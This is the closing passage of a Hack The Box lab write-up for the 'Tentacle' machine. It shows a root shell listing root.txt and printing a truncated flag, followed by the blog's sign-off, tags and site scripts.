[root@srv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@srv01 ~]# cat root.txt
c97762a4b7e7fe22b[...]
</pre></table></code></div></div><p>And there you have it! Not an easy box but nevertheless I have learned a lot! :)</p><p>See you on the next hacking adventure!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>HACK THE BOX</a>, <a href='/categories/tentacle/'>Tentacle</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tentacle/" class="post-tag no-text-decoration" >tentacle</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB-Tentacle+-+Ch1mp3y&url=http%3A%2F%2Fchimpey.com%2Fposts%2FTENTACLE%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB-Tentacle+-+Ch1mp3y&u=http%3A%2F%2Fchimpey.com%2Fposts%2FTENTACLE%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=http%3A%2F%2Fchimpey.com%2Fposts%2FTENTACLE%2F&text=HTB-Tentacle+-+Ch1mp3y" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Websockets/">Hacking websockets</a><li><a href="/posts/Docker/">Escaping Docker containers</a><li><a href="/posts/TENTACLE/">HTB-Tentacle</a><li><a href="/posts/SECRET/">HTB-Secret</a><li><a href="/posts/DRIVER/">HTB-Driver</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/DRIVER/"><div class="card-body"> <em class="small" data-ts="1657445230" data-df="ll" > Jul 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Driver</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Driver] — Target machine: 10.129.195.84 Attack machine: 10.10.14.11 Driver form Hack the Box Index NMAP SMB-share file attack Privileged Escalation ...</p></div></div></a></div><div class="card"> <a href="/posts/SECRET/"><div class="card-body"> <em class="small" data-ts="1657474920" data-df="ll" > Jul 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Secret</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Secret] — Target machine: 10.129.198.24 Attack machine: Secret from Hack the Box Index Enumerating Register user and Login Code Review Creating adm...</p></div></div></a></div><div class="card"> <a href="/posts/Websockets/"><div class="card-body"> <em class="small" data-ts="1659264600" data-df="ll" > Jul 31, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hacking websockets</h3><div class="text-muted small"><p> categories: [Knowledge Base] tags: [websockets] — Index Intro What is a Websocket How to spot Websockets in the wild Authentication Input and output validation Cross-Site websocket...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SECRET/" class="btn btn-outline-primary" prompt="Older"><p>HTB-Secret</p></a> <a href="/posts/Docker/" class="btn btn-outline-primary" prompt="Newer"><p>Escaping Docker containers</p></a></div><script src="https://utteranc.es/client.js" repo="Ch1mp3y/ch1mp3y.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Ch1mp3y</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WXLRG68JVE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WXLRG68JVE'); }); </script>
